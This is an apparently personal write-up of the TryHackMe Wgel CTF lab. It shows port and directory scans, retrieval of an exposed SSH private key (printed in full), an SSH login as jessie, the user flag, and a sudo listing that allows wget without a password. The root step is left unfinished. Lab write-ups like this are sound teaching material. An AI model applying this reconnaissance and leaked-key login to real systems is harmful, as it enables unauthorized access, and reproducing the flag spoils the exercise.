# WGEL CTF [Tryhackme](https://tryhackme.com/r/room/wgelctf) 

Task 1.
Ques 1. User flag
```bash
057c67131c3d5e42dd5cd3075b198ff6
````
Ques 2. Root flag
```bash
```

## 1. Let make a scan
```bash
┌──(death㉿esther)-[~/Lab-CTF/wgel]
└─$ nmap -sV -sC 10.10.184.4 -Pn     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 17:31 IST
Nmap scan report for 10.10.184.4
Host is up (1.6s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.10 seconds
```
### OK So SSH & HTTP is open 
## 2. Let make a Dir scan 
```bash
┌──(death㉿esther)-[~/Lab-CTF/wgel]
└─$ dirsearch -u 10.10.184.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/wgel/reports/_10.10.184.4/_24-04-09_17-31-17.txt

Target: http://10.10.184.4/

[17:31:17] Starting: 
[17:31:30] 403 -  276B  - /.ht_wsr.txt
[17:31:30] 403 -  276B  - /.htaccess.bak1
[17:31:30] 403 -  276B  - /.htaccess.sample
[17:31:30] 403 -  276B  - /.htaccess.orig
[17:31:30] 403 -  276B  - /.htaccess_extra
[17:31:30] 403 -  276B  - /.htaccessBAK
[17:31:30] 403 -  276B  - /.htaccess_sc
[17:31:30] 403 -  276B  - /.htaccess_orig
[17:31:30] 403 -  276B  - /.htaccessOLD
[17:31:30] 403 -  276B  - /.html
[17:31:30] 403 -  276B  - /.htaccess.save
[17:31:30] 403 -  276B  - /.htaccessOLD2
[17:31:30] 403 -  276B  - /.htm
[17:31:30] 403 -  276B  - /.htpasswd_test
[17:31:30] 403 -  276B  - /.httr-oauth
[17:31:30] 403 -  276B  - /.htpasswds
[17:35:57] 403 -  276B  - /server-status/
[17:35:57] 403 -  276B  - /server-status
[17:36:01] 301 -  312B  - /sitemap  ->  http://10.10.184.4/sitemap/

Task Completed
```

## 3. Let Visite ip 

### I got username ```jessie``` in apache page code
![Screenshot from 2024-04-09 17-40-17](https://github.com/Esther7171/Wgel-Ctf/assets/122229257/e203f2b2-20a4-443a-92cd-3e115f1192b5)

### Let visite http://10.10.184.4/sitemap/
![Screenshot from 2024-04-09 17-39-41](https://github.com/Esther7171/Wgel-Ctf/assets/122229257/99831b4d-a0e9-49c2-bc3c-c04b85e3512a)

### This is website let discover more dir
```bash
┌──(death㉿esther)-[~/Lab-CTF/wgel]
└─$ dirsearch -u http://10.10.184.4/sitemap/

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/wgel/reports/http_10.10.184.4/_sitemap__24-04-09_17-39-12.txt

Target: http://10.10.184.4/

[17:39:12] Starting: sitemap/
[17:39:17] 301 -  315B  - /sitemap/js  ->  http://10.10.184.4/sitemap/js/
[17:39:28] 200 -   14KB - /sitemap/.DS_Store
[17:39:31] 403 -  276B  - /sitemap/.htaccess.bak1
[17:39:31] 403 -  276B  - /sitemap/.ht_wsr.txt
[17:39:31] 403 -  276B  - /sitemap/.htaccess.sample
[17:39:31] 403 -  276B  - /sitemap/.htaccess.orig
[17:39:31] 403 -  276B  - /sitemap/.htaccess.save
[17:39:31] 403 -  276B  - /sitemap/.htaccess_sc
[17:39:31] 403 -  276B  - /sitemap/.htaccess_extra
[17:39:31] 403 -  276B  - /sitemap/.htaccess_orig
[17:39:31] 403 -  276B  - /sitemap/.htaccessBAK
[17:39:31] 403 -  276B  - /sitemap/.htaccessOLD
[17:39:31] 403 -  276B  - /sitemap/.htaccessOLD2
[17:39:31] 403 -  276B  - /sitemap/.htm
[17:39:31] 403 -  276B  - /sitemap/.html
[17:39:31] 403 -  276B  - /sitemap/.htpasswd_test
[17:39:31] 403 -  276B  - /sitemap/.htpasswds
[17:39:31] 403 -  276B  - /sitemap/.httr-oauth
[17:39:37] 200 -    2KB - /sitemap/.sass-cache/
[17:39:37] 200 -  460B  - /sitemap/.ssh/
[17:39:37] 301 -  317B  - /sitemap/.ssh  ->  http://10.10.184.4/sitemap/.ssh/
[17:39:38] 200 -    2KB - /sitemap/.ssh/id_rsa
[17:39:51] 200 -    3KB - /sitemap/about.html
[17:40:31] 200 -    3KB - /sitemap/contact.html
[17:40:33] 301 -  316B  - /sitemap/css  ->  http://10.10.184.4/sitemap/css/
[17:40:45] 301 -  318B  - /sitemap/fonts  ->  http://10.10.184.4/sitemap/fonts/
[17:40:53] 301 -  319B  - /sitemap/images  ->  http://10.10.184.4/sitemap/images/
[17:40:53] 200 -    1KB - /sitemap/images/
[17:40:57] 200 -  812B  - /sitemap/js/

Task Completed
```
### I got .ssh let go to it
![Screenshot from 2024-04-09 17-45-03](https://github.com/Esther7171/Wgel-Ctf/assets/122229257/312b71b7-74a0-4555-beff-843d219c2167)
### Let copy the rsa key
![Screenshot from 2024-04-09 17-45-33](https://github.com/Esther7171/Wgel-Ctf/assets/122229257/e0a3d363-3f48-4e58-8760-79118007b8f5)
```bash-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----

```

## 4. Let Log-in ssh
* change permision of rsa
```bash
┌──(death㉿esther)-[~/Lab-CTF/wgel]
└─$ chmod 600 id_rsa
```
### try to log-in
```bash
┌──(death㉿esther)-[~/Lab-CTF/wgel]
└─$ ssh jessie@10.10.184.4 -i id_rsa 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```
### I Got first flag 
```bash
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
jessie@CorpOne:~/Documents$ 
```
### 5. Let privilage   
```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
